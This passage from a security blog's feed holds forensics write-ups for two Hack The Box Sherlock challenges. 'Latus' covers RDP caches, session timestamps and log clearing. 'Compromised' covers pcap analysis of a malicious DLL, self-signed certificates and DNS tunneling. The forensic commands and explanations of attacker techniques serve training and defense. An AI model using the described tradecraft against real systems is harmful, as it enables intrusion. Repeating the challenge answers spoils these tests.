timestamp associated with <code class="language-plaintext highlighter-rouge">mstsc.exe</code> itself, or <code class="language-plaintext highlighter-rouge">mstsc.exe.mui</code>, or a different instance of <code class="language-plaintext highlighter-rouge">mstsc.exe.mun</code>, or another associated file. Again, if you have a definitive answer for <em>why</em> this is the correct answer, please let me know.</p> <h2 id="task-8-how-long-did-the-penultimate-rdp-session-last">Task 8: How long did the penultimate RDP session last?</h2> <p>This question is looking for the duration of the second to last RDP session. What we really need here is a start time and an end time for the session. In my chronology of solving this CTF, this question was one of the last solved. There are a lot of different resources to look at and it’s hard to know which ones to focus on for definitive start and end times.</p> <p>Solving Task 9 first is helpful. Solving it means that you have identified at least one method to find the ending timestamp of an RDP session. In fact, I think everything will make more sense if I take the writeup in that direction too. We will return to Task 8 after completing Task 9.</p> <h2 id="task-9-when-did-the-attacker-disconnect-the-last-remote-desktop-rdp-session-utc">Task 9: When did the attacker disconnect the last Remote Desktop (RDP) session? (UTC)</h2> <p>So what would change when an RDP connection disconnects? At first, I expected it to be a credential, something similar to the credential being accessed in Task 5. But its not that. That makes sense right? Credentials are used to initiate a connection, not to terminate one.</p> <p>Returning to some other files we found back in Task 5, we notice some interesting correlations between them.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/59.png" sizes="95vw"/> <img src="/assets/img/latus/59.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>It turns out that the timestamp ending in 3, associated with Default.rdp is the correct answer. I am not sure if its standard for Default.rdp to be modified upon termination of an RDP session, though I don’t think it is. However, it does make sense that the cache associated with an RDP session, <code class="language-plaintext highlighter-rouge">cache0001.bin</code> in this case, would be last modified at the time the session was terminated. The fact that it is off by 1 second could be a rounding issue or simply due to a small discrepancy in the times that different processes occurred when the RDP session terminated.</p> <p>Either way these times were correlated. Even though we can’t see other times that Default.rdp was modified, we now know that the last-modified time of a <code class="language-plaintext highlighter-rouge">cache0000x.bin</code> file was correlated with the end of a session within 1 second. We can go back and use this to help us solve Task 8.</p> <h2 id="re-task-8-how-long-did-the-penultimate-rdp-session-last">Re: Task 8: How long did the penultimate RDP session last?</h2> <p>Based on Task 9, we’ll start with the idea that the <strong>session end time</strong> is the last-modified time of either <code class="language-plaintext highlighter-rouge">cache0000.bin</code> or <code class="language-plaintext highlighter-rouge">cache0002.bin</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/59a.png" sizes="95vw"/> <img src="/assets/img/latus/59a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Considering that <code class="language-plaintext highlighter-rouge">cache0002.bin</code> was last modified on the 26th, we’ll go with <code class="language-plaintext highlighter-rouge">cache0000.bin</code> at <code class="language-plaintext highlighter-rouge">2024-06-28 13:40:21</code> (when converted to UTC) for the <strong>session end time</strong>.</p> <p>What about the <strong>session start time</strong>? At first I went back to the credential files. They looked really promising as they were last accessed at <code class="language-plaintext highlighter-rouge">2024-06-28 13:33:21</code>, making the session about 7 minutes long. Unfortunately none of the credentials’ timestamps worked to calculate the correct answer.</p> <p>Next I went back to Autopsy and the execution times. Unfortunately, none of the execution times of <code class="language-plaintext highlighter-rouge">mstsc.exe</code> seemed to make sense. However, I did end up noticing a sort of interesting correlation.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/43.png" sizes="95vw"/> <img src="/assets/img/latus/43.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>This shows an execution of mstsc.exe only about 25 seconds after our <strong>session end time</strong>. Perhaps this is the execution that precedes the final session from Task 9.</p> <p>Unfortunately we are still lacking a <strong>session start time</strong> for Task 8. Honestly, around this point I looked at a lot of options to see where I could maybe get more sources of information, but not too much was available. The registry write times weren’t helpful, the USN Journal wasn’t available in the evidence, I had reconstructed the images stored in the caches for Task 11 so I searched through them to see if I could see any timestamps (see Task 11 for details on these images).</p> <p>After a lot of searching I started just brute spraying any timestamps from $MFT of any files that seemed likely. I ended up hitting on the correct answer, but I don’t exactly understand why it is the correct answer. The timestamp for the session start time that ended up resulting in the correct answer was the <strong>last-access time of cach0002</strong>.</p> <p>I wanted to corroborate this time with some other timestamps, so I searched for any timestamps on either side of the one that resulted in the right answer to see if anything else came close and made more sense, but nothing came up.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/43a.png" sizes="95vw"/> <img src="/assets/img/latus/43a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>I do not know why the last-accessed time of an RDP cache marks the beginning of another. Perhaps when a session starts, the app accesses the last cache that it used to check if that cache can be used again for the new session.</p> <h2 id="task-10-what-is-the-size-of-the-remote-desktop-configured">Task 10: What is the size of the remote desktop configured?</h2> <p>I had already noticed this value while examining <strong>emman.t</strong>’s <code class="language-plaintext highlighter-rouge">Default.rdp</code>.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/59b.png" sizes="95vw"/> <img src="/assets/img/latus/59b.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-11-what-tool-did-attacker-use-to-discover-the-network-after-moving-laterally-to-19216870133">Task 11: What tool did attacker use to discover the network after moving laterally to 192.168.70.133?</h2> <p>For this task, we need to find out what happened on a <em>different machine</em>, other than the one the evidence image is from. After some fumbling around trying to look at console history, etc. I found that RDP caches store images of static parts of the machine that is the server in the connection. This is to reduce the amount of information that has to be sent over the network during the session, but it also leaves traces of what was done during the RDP session.</p> <p>I used <a href="https://medium.com/@ronald.craft/blind-forensics-with-the-rdp-bitmap-cache-16e0c202f91c">this post</a> by Ronald Craft as a guide for extracting images from the RDP cache. Per the instructions, I used <a href="https://github.com/ANSSI-FR/bmc-tools">BMC Tools</a> for extraction and <a href="https://github.com/brimorlabs/rdpieces">rdpieces</a> for reconstruction. The reason that reconstruction is necessary is that initially BMC Tools generates a bunch of very small image tiles, each of which doesn’t show much. Rdpieces attempts to stitch these back together into coherent images. However, I didn’t find that rdpieces worked very well. It was somewhat better than all the individual tiles, but not very good.</p> <p>It turns out though that BMC Tools’ option to create a collage of the times was the best way to get a look at all the images in the cache, at least for me. To do this, just use the <code class="language-plaintext highlighter-rouge">-b</code> option. BMC Tools outputs <em>a lot</em> of images, so I’d really suggest making an output dir for each cache you plan to extract from.</p> <p>In general:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bmc-tools.py <span class="nt">-s</span> cache_file.bin <span class="nt">-d</span> output_dir <span class="nt">-b</span>
</code></pre></div></div> <p>What it looked like for me:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bmc-tools/bmc-tools.py <span class="nt">-s</span> <span class="s2">"./C/[root]/Users/emman.t/AppData/Local/Microsoft/Terminal Server Client/Cache/Cache0001.bin"</span> <span class="nt">-d</span> cache0001 <span class="nt">-b</span>
</code></pre></div></div> <p>The image artifacts that result from this aren’t perfect, but they could contain interesting information. Here is part of one of the collages for example:</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/59c.png" sizes="95vw"/> <img src="/assets/img/latus/59c.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>But which cache file should we look in? I looked at all of them, but there is a way to can figure out which one the answer should be in:</p> <p>This question asks about the tool used after moving laterally to 192.168.70.133. In Task 9 we found that the last session ended at a time that is correlated with the last-modified time of <strong>emman.t</strong>’s <code class="language-plaintext highlighter-rouge">Default.rdp</code>. The IP listed in that <code class="language-plaintext highlighter-rouge">Default.rdp</code> is 192.168.70.133, meaning that the last session whose end-time we found was connecting to 192.168.70.133. Given that knowledge, to look for a tool used on 192.168.70.133 we should look at the cache file that was last modified around that same time. Considering the last-modified times of the 3 cache files, one should stand out.</p> <p>After a lot of searching, I came across the name of the tool. It was clearly visible but broken into two parts.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/63.png" sizes="95vw"/> <img src="/assets/img/latus/63.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-12-when-was-the-event-log-deleted-by-the-attacker-utc">Task 12: When was the event log deleted by the attacker? (UTC)</h2> <p>Now, the attacker didn’t actually delete <em>all</em> the logs. Checking in <code class="language-plaintext highlighter-rouge">C:\Windows\System32\winevt\logs</code>, we can see a bunch of log files. Though many of them are empty, indicated by 68k size, some of them are not.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/63a.png" sizes="95vw"/> <img src="/assets/img/latus/63a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The powershell logs looked interesting, I used <a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw</a> to query all the logs that existed in the logs directory and search for the word “powershell” like this:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chainsaw search <span class="nt">--timestamp</span> <span class="s1">'Event.System.TimeCreated_attributes.SystemTime'</span> <span class="nt">--to</span> <span class="s2">"2024-06-28T23:59:59"</span> <span class="nt">--skip-errors</span> <span class="s2">"powershell"</span> C/<span class="se">\[</span>root<span class="se">\]</span>/Windows/System32/winevt/Logs
</code></pre></div></div> <p>I could have isolated the search to the powershell logs, but I was interested to see if anything else would come back. Either way, this worked. There were only a few results and they definitely contain evidence of log destruction.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/63b.png" sizes="95vw"/> <img src="/assets/img/latus/63b.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The log excerpt above shows a command designed to loop through the log files and clear each one using <code class="language-plaintext highlighter-rouge">wevtutl.exe</code>, a tool used for managing windows event logs.</p> <h2 id="task-13-what-time-did-attacker-disconnect-session-to-19216870129-utc">Task 13: What time did attacker disconnect session to 192.168.70.129? (UTC)</h2> <p>Well, which machine is 192.168.70.129? Grepping for that IP through all the files in evidence turns up only one result: <code class="language-plaintext highlighter-rouge">C/[root]/Users/emman.t/AppData/Local/Microsoft/Edge/User Data/Default/Network/Network Persistent State</code>. This is a config file for Edge and contains the IP as part of its QUIC config, indicating that 192.168.70.129 is actually the local IP of the machine that the evidence was collected from.</p> <p>When did the attacker disconnect from this machine? Well, they must have disconnected <em>after</em> deleting the logs, so why not check the logs? I used chainsaw again to search for any logoff (event ID 4634) logs after the time the logs were deleted:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chainsaw search <span class="nt">--timestamp</span> <span class="s1">'Event.System.TimeCreated_attributes.SystemTime'</span> <span class="nt">--from</span> <span class="s2">"2024-06-27T14:03:25"</span> <span class="nt">--skip-errors</span> <span class="s2">"4634"</span> C/<span class="se">\[</span>root<span class="se">\]</span>/Windows/System32/winevt/Logs
</code></pre></div></div> <p>Six results are returned, but only 1 is a LogonType: 3 (network logon), while the others are type 2 (interactive). Assuming the attacker was logging on via network, I tried this timestamp and it was correct.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/63c.png" sizes="95vw"/> <img src="/assets/img/latus/63c.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="conclusion">Conclusion</h2> <p>This was an unconventional Sherlock for sure, but in some really amazing ways. The (near) lack of logs often forced me to think outside the box to retrieve information that would have normally been available in one log or another. This meant I had to do a significant amount of research to solve some tasks. I ended up learning a lot–even some entirely new (to me) techniques like extracting image artifacts from RDP caches–and learning is always my end goal for doing Sherlocks, so I was quite pleased with that.</p> <p>Another aspect of this Sherlock that I liked was that Task 5 (retrieving the credentials) requires the participants to take on the perspective of the attacker and use some offensive techniques in the name of forensics. It’s obvious that using offensive techniques to test defenses can help build better defenses, but it’s less obvious that directly using offensive techniques could be helpful in the investigation of an attack. I think this Sherlock does a great job highlighting the importance of being familiar with offensive skills no matter your role in cybersecurity.</p> <p>All in all, I really enjoyed completing this challenge and I can’t wait for the next one!</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="hard"/><category term="sherlock"/><category term="HackTheBox"/><summary type="html"><![CDATA[A write-up for Hack The Box's forensics challenge 'Latus']]></summary></entry><entry><title type="html">HTB Write-Up | Easy Sherlock | Compromised</title><link href="https://its-radio.github.io/blog/2024/Compromised-Write-Up/" rel="alternate" type="text/html" title="HTB Write-Up | Easy Sherlock | Compromised"/><published>2024-11-25T00:00:00+00:00</published><updated>2024-11-25T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/Compromised-Write-Up</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/Compromised-Write-Up/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>This is a writeup for Hack The Box’s new Sherlock challenge, <strong>Compromised</strong>. This Sherlock is rated as <strong>Easy</strong>, so I’ll tailor this write-up to be beginner friendly and approachable. I’ll try to cover my methods thoroughly and explain the reasoning for each decision that I make.</p> <p>For this demo I’m using Fedora 40 as my OS, but everything I do should be easy to repeat on any Linux-based OS</p> <h2 id="starting-out">Starting Out</h2> <p>Let’s read the description and see what information we can glean.</p> <p>“Our SOC team detected suspicious activity in Network Traffic, the machine has been compromised and company information that should not have been there has now been stolen – it’s up to you to figure out what has happened and what data has been taken.”</p> <h3 id="big-takeaways-from-the-description">Big takeaways from the description</h3> <ol> <li>Suspicious network traffic detected</li> <li>At least one machine has been compromised</li> <li>The compromised machine contained sensitive company data that was supposed to be better protected (presumably it was a breach of policy to have this data on the machine to begin with)</li> <li>The sensitive data was exfiltrated</li> </ol> <h2 id="getting-ahold-of-the-data">Getting ahold of the data</h2> <p>Next, let’s take a look at the file that was provided with the challenge and see what we are working with.</p> <h2 id="downloading-compromisedzip-and-unzipping-it">Downloading compromised.zip and unzipping it</h2> <p>Here I used <code class="language-plaintext highlighter-rouge">7z</code> to decompress the archive after the standard <code class="language-plaintext highlighter-rouge">unzip</code> command failed. I think that’s fairly standard across the Sherlock challenges. Other compression tools might work, but 7z is a popular and easy choice. Keep in mind that you’ll need to enter a password in order to decompress the archive. You can get the password on HTB as shown in the image below.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/1.png" sizes="95vw"/> <img src="/assets/img/compromised/1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Decompress the archive as shown and take a look at what’s inside.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/2.png" sizes="95vw"/> <img src="/assets/img/compromised/2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The file inside is <code class="language-plaintext highlighter-rouge">capture.pcap</code>. Files with the extension <code class="language-plaintext highlighter-rouge">.pcap</code> are packet captures, containing the raw packets sent over a network. There are many tools built for analyzing packet captures, but today we will use one of the most popular–-Wireshark. Now that we know what evidence we are working with, let’s dive into Task 1.</p> <h2 id="task-1-what-is-the-ip-address-used-for-initial-access">Task 1: What is the IP address used for initial access?</h2> <p>Okay, we are required to find out what is the malicious IP used by the attackers for initial access to the compromised machine. Let’s start with assessing all the IPs that are included in capture.pcap. Open it in Wireshark.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-4"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/3.png" sizes="95vw"/> <img src="/assets/img/compromised/3.png" class="img-fluid rounded z-depth-1 small-img" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>And then take a look at <strong>statistics &gt; conversations</strong></p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/4.png" sizes="95vw"/> <img src="/assets/img/compromised/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>This is a handy feature of Wireshark that summarizes all the conversations (i.e. unique combinations of source and destination IP address) that exist in a pcap.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/5.png" sizes="95vw"/> <img src="/assets/img/compromised/5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The conversations analysis shows that some IP addresses have exchanged significantly more data than others. While this is interesting, and should be noted for later, it doesn’t let us know exactly which IP was used for initial access. Let’s try something else.</p> <p>The outlying data transfers are large enough that it’s likely they could have transferred files over the network. Let’s check if any of those files were transferred without encryption and in a way that we can extract them. Wireshark allows us to export objects that were transferred in the pcap we are looking at. Use <strong>File &gt; Export Objects &gt; HTTP</strong>. I’m starting with HTTP just because that’s a common protocol and likely to give us results.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/6.png" sizes="95vw"/> <img src="/assets/img/compromised/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Looking at the exportable objects, we see that there are quite a few.</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/7.png" sizes="95vw"/> <img src="/assets/img/compromised/7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>However, one stands out as being much larger than the others, as well as being categorized as an image. Let’s take a look at that and see what we can find out about it. Also, we can see the IP that the file came from, which could come in handy in case this turns out to be a malicious payload (spoiler: it’s going to be important). Click the save button and select a folder to save the file to. The file will be called <strong>6ctf5JL</strong> with no extension.</p> <p>Next, we’ll use the <code class="language-plaintext highlighter-rouge">file</code> command in the terminal as a starting point to investigate the file.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/8.png" sizes="95vw"/> <img src="/assets/img/compromised/8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Here we can see that the <code class="language-plaintext highlighter-rouge">file</code> command reports that the downloaded file is a <strong>PE32 executable (DLL)</strong>. This indicates that the file is a DLL, or a dynamic linked library. This type of file is commonly used to carry malware meant to infect Windows systems. Especially given the strange name and lack of extension, we should consider this a malicious file until proven otherwise. It’s probable that <strong>6ctf5JL</strong> had to do with the initial access. Trying that IP address we associated with the file earlier, we can see that it is indeed the correct answer for task 1.</p> <h2 id="task-2-what-is-the-sha256-hash-of-the-malware">Task 2: What is the SHA256 hash of the malware?</h2> <p>Since we have already downloaded what appears to be a malicious file, let’s assume that’s the malware they are referring to. Simply hash it with the sha256sum command and enter the hash as the answer.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/9.png" sizes="95vw"/> <img src="/assets/img/compromised/9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-3-what-is-the-family-label-of-the-malware">Task 3: What is the Family label of the malware?</h2> <p>Similar malware is often said to be in the same “family” and classified under a single family name. If this malware is well known, it’s probable that this type of information could be available on VirusTotal. Upload the file to virustotal.com or search the SHA256 and take a look at the results.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/10.png" sizes="95vw"/> <img src="/assets/img/compromised/10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>There are a few family labels, one of which is the answer to this question. You can also get to the same result by just Googling the SHA256 hash (though the answer is less obvious with that method).</p> <h2 id="task-4-when-was-the-malware-first-seen-in-the-wild-utc">Task 4: When was the malware first seen in the wild (UTC)</h2> <p>This sounds like another job for VirusTotal. Poke around in the information you can find about the malware on VirusTotal and you should be able to find the answer.</p> <h2 id="task-5-the-malware-used-https-traffic-with-a-self-signed-certificate-what-are-the-ports-from-smallest-to-largest">Task 5: The malware used HTTPS traffic with a self-signed certificate. What are the ports, from smallest to largest?</h2> <p>For this, we’ll need to head back to Wireshark. To isolate HTTPS traffic in wireshark, we need to apply a filter in the filter bar. Specifically, we need to filter for TLS traffic. Type <code class="language-plaintext highlighter-rouge">tls</code> in the filter bar, and press enter.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/11.png" sizes="95vw"/> <img src="/assets/img/compromised/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>We can see that this filter returns only packets using the TLS protocol. TLS stands for Transport Layer Security and is the protocol that secures and encrypts HTTPS traffic. Typically an HTTPS server uses port 443, but in the conversations above, we can see that a few non-standard ports are being used. If we select a packet that contains “Certificate, Server Key Exchange, Server Hello Done” in the Info field and expand the TLS information included in the packet (shown below; lower left of the image), we can get some more information about whether or not this is one of the self-signed HTTPS certificates mentioned in the question.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/12.png" sizes="95vw"/> <img src="/assets/img/compromised/12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>A certificate is self-signed when the issuer is the same as the subject. As we can tell from examining the certificate information, each piece of information about the issuer of this certificate matches the corresponding piece of information about the subject, meaning that this certificate is indeed self-signed.</p> <p>So, we know that one of the ports we are looking for is 2078, but there are two more. You can find them using a similar method to the one we have just reviewed.</p> <p>If you’re having trouble finding other ports being used with self-signed certificates, try sorting the packets by <strong>destination port</strong> to identify suspicious ports, then filter by that port in the filter bar to isolate the conversation and identify the packet containing the certificate information.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/13.png" sizes="95vw"/> <img src="/assets/img/compromised/13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Then filter:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/14.png" sizes="95vw"/> <img src="/assets/img/compromised/14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-6-what-is-the-id-at-localityname-of-the-self-signed-certificate-associated-with-the-first-malicious-ip">Task 6: What is the id-at-localityName of the self-signed certificate associated with the first malicious IP?</h2> <p><strong>id-at-localityName</strong> is a piece of information contained in the certificate. So, selecting the same packet that we did for the last question, we can examine the cert information to find <strong>id-at-localityName</strong>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/15.png" sizes="95vw"/> <img src="/assets/img/compromised/15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-7-what-is-the-notbefore-timeutc-for-this-self-signed-certificate">Task 7: What is the notBefore time(UTC) for this self-signed certificate?</h2> <p>Again, this information can be found by examining the certificate information. This time, it is under the <strong>validity</strong> information. If you’ve come this far, it should be quite easy to find.</p> <h2 id="task-8-what-was-the-domain-used-for-tunneling">Task 8: What was the domain used for tunneling?</h2> <p>Tunneling is a technique that attackers use to send information over protocols that are commonly used but not usually used to send large amounts of data. To get an idea of what to look for, we should get a high level view of what protocols were used in this pcap. Luckily, Wireshark has just the tool for this job. As we did at the beginning of this Sherlock, we’ll be using Wireshark’s Statistics menu again. This time, select <strong>Statistics &gt; Protocol Hierarchy</strong> (make sure to clear other filters you may have applied before doing this).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/16.png" sizes="95vw"/> <img src="/assets/img/compromised/16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Immediately one of the protocols stands out.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/17.png" sizes="95vw"/> <img src="/assets/img/compromised/17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>DNS accounts for 76% of the packets and 37% of the bytes sent in this pcap. That is very abnormal as DNS is meant to resolve domain names, not transfer data. However, since DNS is whitelisted in almost every network, it is a popular choice for tunneling. It is likely the tunneling occurred over dns, but what domain was used for the tunneling? To find out, let’s apply a filter for ‘dns’ and check out the results.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/compromised/18.png" sizes="95vw"/> <img src="/assets/img/compromised/18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>What we see in the screenshot above is repeated DNS queries for the same TLD (top level domain), but to different subdomains. The exfiltrated data is split up and encoded as these subdomain queries. The data will then be reassembled on the other side by the attackers. This is another indicator of DNS tunneling, so we can be pretty confident that the TLD that these queries are for is the one they are looking for in the answer.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="easy"/><category term="sherlock"/><category term="pcap"/><category term="HackTheBox"/><summary type="html"><![CDATA[A beginner-friendly write-up for Hack The Box's forensics challenge 'Compromised']]></summary></entry><entry><title type="html">How To Implement CMMC At Your Organization</title><link href="https://its-radio.github.io/blog/2024/CMMC-2.0-Implementation/" rel="alternate" type="text/html" title="How To Implement CMMC At Your Organization"/><published>2024-10-17T00:00:00+00:00</published><updated>2024-10-17T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/CMMC-2.0-Implementation</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/CMMC-2.0-Implementation/"><![CDATA[<p>Implementing any security framework starts with knowing your organization and knowing the framework, and implementing CMMC is not an exception. Summit 7 Systems, a firm that specializes in assisting DIB (Defense Industrial Base) organizations in achieving compliance with CMMC and other frameworks, advises its customers to expect 7 main steps to prepare for a CMMC audit <a class="citation" href="#summit_7_systems_7_nodate">(Systems, 2023)</a>. Their main focus as a company is on Microsoft systems and MSP services, so that’s what they recommend. However, their steps serve as a solid guide to get an idea of what needs to be done to achieve certification and I have reordered and added to their steps to be applicable to a wider 